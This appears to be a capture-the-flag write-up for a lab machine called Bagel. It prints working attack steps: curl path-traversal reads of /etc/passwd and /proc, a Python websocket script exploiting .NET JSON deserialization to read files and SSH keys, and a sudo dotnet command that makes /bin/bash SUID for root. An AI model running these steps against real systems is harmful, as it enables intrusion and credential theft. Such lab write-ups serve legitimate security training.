# Bagel

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.150.229
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 23:21 EST
Nmap scan report for 10.129.150.229
Host is up (0.17s latency).
Not shown: 65327 closed tcp ports (conn-refused), 205 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
8000/tcp open  http-alt
```

Added `bagel.htb` to the `/etc/hosts` file. Running a detailed scan shows that port 8000 ws a Werkzeug server. Nothing else was revealed.

```
$ sudo nmap -p 22,5000,8000 -sC -sV -O -T4 10.129.150.229
...
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
|_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html
```

### Bagel Shop LFI

Port 8000 hosted a web application selling bagels.

<figure><img src="../../../.gitbook/assets/image (3633).png" alt=""><figcaption></figcaption></figure>

The interesting parameter here was the URL, which was `http://bagel.htb/?page=index.html`. LFI works here and I can view the `/etc/passwd` file.

```
$ curl http://bagel.htb:8000/?page=../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
setroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
chrony:x:994:992::/var/lib/chrony:/sbin/nologin
dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
systemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin
systemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
_laurel:x:987:987::/var/log/laurel:/bin/false
```

The users are `phil` and `developer`. There's an orders page with the previous orders made.

```
$ curl http://bagel.htb:8000/orders                         
order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]
order #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]
order #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels]
```

Not too sure what to make of the orders, but at least we have an LFI. `gobuster` revealed no other directories of interest. Since we have no other information of the file system in the machine, we can view the `/proc/self/cmdline` file to view the processes that are running.

<figure><img src="../../../.gitbook/assets/image (1724).png" alt=""><figcaption></figcaption></figure>

Now we can download the source code and begin enumerating possible vulnerabilities.

### Source Code Reviews

Here's the code for the application:

{% code overflow="wrap" %}
```python
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
```
{% endcode %}

So there's a DLL file somewhere that is used to read orders from an `orders.txt` file. Websockets are used to connect to port 5000. We should find this DLL file, but I don't know where to look as of now. Instead, we can try writing a script to connect to this WebSocket and abuse it somehow as it does not seem to take any user input.&#x20;

I tested this by changing `ReadOrder` to `WriteOrder` and creating this script here to connect:

```python
import websocket,json

ws = websocket.WebSocket()
ws.connect("ws://10.129.150.229:5000/")
order = {"WriteOrder":"test"}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
```

When viewing the `/orders` page again, we see that I have successfully overwritten everything there.

```
$ curl http://bagel.htb:8000/orders
test 
```

The exploit has to do with how user input is not sanitised and the `json.dumps` function. Some type of deserialization exploit related to the DLL needs to be used here.

I decided to brute force the PIDs that were running on this machine, and I managed to find the DLL.

```
$ for i in $(seq 800 1000); do curl http://bagel.htb:8000/?page=../../../../proc/$i/cmdline -o -; echo "  PID => $i"; done 
...<REDACTED>...
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 916
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 917
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 918
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 919
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 920
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 921
```

Now, I can download the DLL file and port it over to Windows for analysis with DnSpy. When opened, we find the code for 3 Order functions, 1 ReadFile function and the deserialize function I found.

{% code overflow="wrap" %}
```csharp
public object RemoveOrder { get; set; }		
public string WriteOrder
{
	get
	{
		return this.file.WriteFile;
	}
	set
	{
		this.order_info = value;
		this.file.WriteFile = this.order_info;
	}
}
public string ReadOrder
{
	get
	{
		return this.file.ReadFile;
	}
	set
	{
		this.order_filename = value;
		this.order_filename = this.order_filename.Replace("/", "");
		this.order_filename = this.order_filename.Replace("..", "");
		this.file.ReadFile = this.order_filename;
	}
}

public string get_ReadFile()
{
	return this.file_content;
}

public object Deserialize(string json)
{
	object result;
	try
	{
		result = JsonConvert.DeserializeObject<Base>(json, new JsonSerializerSettings
		{
			TypeNameHandling = 4
		});
	}
	catch
	{
		result = "{\"Message\":\"unknown\"}";
	}
	return result;
}
```
{% endcode %}

TypeNameHandling = 4 means this:

> Include the .NET type name when the type of the object being serialized is not the same as its declared type. Note that this doesn't include the root serialized object by default. To include the root object's type name in JSON you must specify a root type object with SerializeObject(Object, Type, JsonSerializerSettings) or Serialize(JsonWriter, Object, Type).
>
> [https://www.newtonsoft.com/json/help/html/T\_Newtonsoft\_Json\_TypeNameHandling.htm](https://www.newtonsoft.com/json/help/html/T\_Newtonsoft\_Json\_TypeNameHandling.htm)

I also found some credentials here:

<figure><img src="../../../.gitbook/assets/image (2260).png" alt=""><figcaption></figcaption></figure>

From the 3 main functions, it seems that ReadOrder does check for LFI, so that's not exploitable. WriteOrder does not seem to do much, but RemoveOrder is suspiciously short and does nothing. For our JSON deserialisation exploit, perhaps we should use this as the main function for exploitataion. We know from the main function of the DLL that the code **always deserializes the input we give it no matter what**.

### Deserialization

We know that this is a .NET related JSON deserialisation exploit based on the DLL. This resource was particularly helpful in creating the payload:

{% embed url="https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15" %}

```json
{
  "$type": "System.IO.FileInfo, System.IO.FileSystem",
  "fileName": "test.txt",
  "attributes": 2
}
```

For our payload, we would first need to add the the 'RemoveOrder' function, then nest our payload within it. Since the TypeNameHandling = 4, the `$type` variable has to call the root object's type, in this case it would be `bagel_server.file,bagel` as per the DLL object names.&#x20;

Afterwards, we can call the `ReadFile` function to read whatever file we want.&#x20;

This was my code and output: (took a while of testing)

```python
import websocket,json

ws = websocket.WebSocket()
ws.connect("ws://10.129.150.229:5000/")
order = {"RemoveOrder":{"$type":"bagel_server.File,bagel", "ReadFile":"../../../../etc/passwd"}}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(result)
```

<figure><img src="../../../.gitbook/assets/image (812).png" alt=""><figcaption></figcaption></figure>

This works! Now, we can attempt to read the user flag and the private SSH key of the user `phil`.

<figure><img src="../../../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>

Then we can SSH in as `phil`.

<figure><img src="../../../.gitbook/assets/image (1751).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Developer Shell

With the credentials we found within the DLL file, we can `su` to become the `developer` user.

<figure><img src="../../../.gitbook/assets/image (3200).png" alt=""><figcaption></figcaption></figure>

### Sudo Dotnet

As the `developer` user, we can run `/usr/bin/dotnet` as the `root` user.

<figure><img src="../../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

Since we can run this, we can simply run `dotnet fsi`, which would open up an interactive interpreter we can use to make `/bin/bash` a SUID binary.

<pre class="language-csharp"><code class="lang-csharp"><strong>using System.Diagnostics;
</strong>string command = "chmod u+s /bin/bash";
ProcessStartInfo psi = new ProcessStartInfo("/bin/bash", $"-c \"{command}\"");
psi.UseShellExecute = false;
psi.RedirectStandardOutput = true;

Process process = new Process();
process.StartInfo = psi;
process.Start();
</code></pre>

Then, either in the same shell or another, we can run `/bin/bash -p` to become root.

<figure><img src="../../../.gitbook/assets/image (463).png" alt=""><figcaption></figcaption></figure>

Rooted!
